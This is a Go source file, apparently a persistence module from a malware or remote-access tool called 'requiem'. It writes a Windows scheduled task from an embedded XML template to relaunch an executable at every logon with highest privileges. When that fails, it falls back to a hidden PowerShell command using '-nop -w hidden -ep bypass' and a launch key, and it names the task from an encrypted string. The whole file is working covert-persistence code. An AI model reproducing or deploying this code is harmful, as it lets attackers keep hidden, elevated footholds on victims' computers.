package persistence

import (
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"requiem/store"
	"requiem/utils"
)

//go:embed schedular.xml
var schedularXML string

func SchedularPersist(filePath string, overrideConfig bool) error {
	if !store.TASK_SCHEDULAR && !overrideConfig {
		return nil
	}

	if filePath == "" {
		filePath = store.ExecPath
	}

	xml := strings.ReplaceAll(schedularXML, "%THE_CMD%", filePath)
	xml = strings.ReplaceAll(xml, "%THE_ARG%", store.LAUNCH_KEY)
	xml = strings.ReplaceAll(xml, "%THE_NAME%", store.DecryptedPersistenceName)

	xmlPath := filepath.Join(os.TempDir(), fmt.Sprintf("%d.xml", time.Now().UnixNano()))

	err := os.WriteFile(xmlPath, []byte(xml), 0666)
	if err == nil {
		defer os.Remove(xmlPath)

		err := utils.RunCommand(
			"schtasks", "/create",
			"/tn", store.DecryptedPersistenceName,
			"/xml", xmlPath,
			"/f",
		)

		if err != nil {
			return err
		}
	} else {
		command := fmt.Sprintf(
			"powershell -nop -w hidden -ep bypass -c \"& '%s' %s\"",
			filePath,
			store.LAUNCH_KEY,
		)

		err := utils.RunCommand(
			"schtasks", "/create",
			"/tn", store.DecryptedPersistenceName,
			"/tr", command,
			"/sc", "ONLOGON",
			"/rl", "HIGHEST",
			"/it", "/f",
		)

		if err != nil {
			return err
		}
	}

	return nil
}

func SchedularUnpersist() error {
	return utils.RunCommand(
		"schtasks", "/delete",
		"/tn", store.DecryptedPersistenceName,
		"/f",
	)
}
